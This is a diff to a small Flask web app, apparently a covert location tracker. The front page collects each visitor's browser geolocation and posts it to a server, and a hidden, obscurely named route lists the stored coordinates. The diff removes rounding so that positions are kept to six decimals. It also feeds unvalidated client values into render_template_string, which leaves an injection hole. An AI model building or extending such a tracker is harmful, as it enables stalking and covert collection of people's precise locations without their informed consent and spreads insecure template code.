@@ -10,19 +10,28 @@ MAIN_HTML = """<!DOCTYPE html>
 <head><title>main</title><style>
 body{background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font:8vw monospace}
 </style></head>
-<body><div id="c">-44 34 44</div>
+<body><div id="c">Определение...</div>
 <script>
 navigator.geolocation.getCurrentPosition(p=>{
-fetch('/track',{method:'POST',body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude}),headers:{'Content-Type':'application/json'}})
-},e=>console.log(e),{enableHighAccuracy:1,timeout:1e4})
+let lat = p.coords.latitude.toFixed(6);
+let lon = p.coords.longitude.toFixed(6);
+document.getElementById('c').innerText = lat + ' ' + lon;
+fetch('/track', {
+    method:'POST',
+    body:JSON.stringify({lat:lat, lon:lon}),
+    headers:{'Content-Type':'application/json'}
+});
+}, e=>{
+document.getElementById('c').innerText = 'Ошибка: ' + e.message;
+}, {enableHighAccuracy:true, timeout:10000});
 </script></body>"""
 
 TRACKER_HTML = """<!DOCTYPE html>
 <html>
 <head><title>tracker</title><style>
-body{background:#000;color:#0f0;margin:20px;font:16px monospace;white-space:pre}
+body{background:#000;color:#0f0;margin:20px;font:14px monospace;white-space:pre}
 </style></head>
-<body>{}<script>setTimeout(()=>location.reload(),5000)</script></body>"""
+<body>{}<script>setTimeout(()=>location.reload(),3000)</script></body>"""
 
 @app.route('/')
 def main():
@@ -30,19 +39,17 @@ def main():
 
 @app.route('/qwertyuiop')
 def tracker():
-    global visitors
-    output = f'Всего записей: {len(visitors)}\n\n'
-    for i, v in enumerate(visitors[-50:], 1):
+    output = f'=== ВСЕГО ЗАПИСЕЙ: {len(visitors)} ===\n\n'
+    for i, v in enumerate(visitors[-100:], 1):
         output += f'{i}. {v["lat"]} {v["lon"]}\n'
     return render_template_string(TRACKER_HTML.format(output))
 
 @app.route('/track', methods=['POST'])
 def track():
-    global visitors
     d = request.get_json()
     if d and 'lat' in d and 'lon' in d:
-        visitors.append({'lat': round(d['lat']), 'lon': round(d['lon'])})
-        print(f'NEW: {d["lat"]} {d["lon"]}')
+        visitors.append({'lat': d['lat'], 'lon': d['lon']})
+        print(f'GEO: {d["lat"]} {d["lon"]}')
     return '', 204
 
 if __name__ == '__main__':
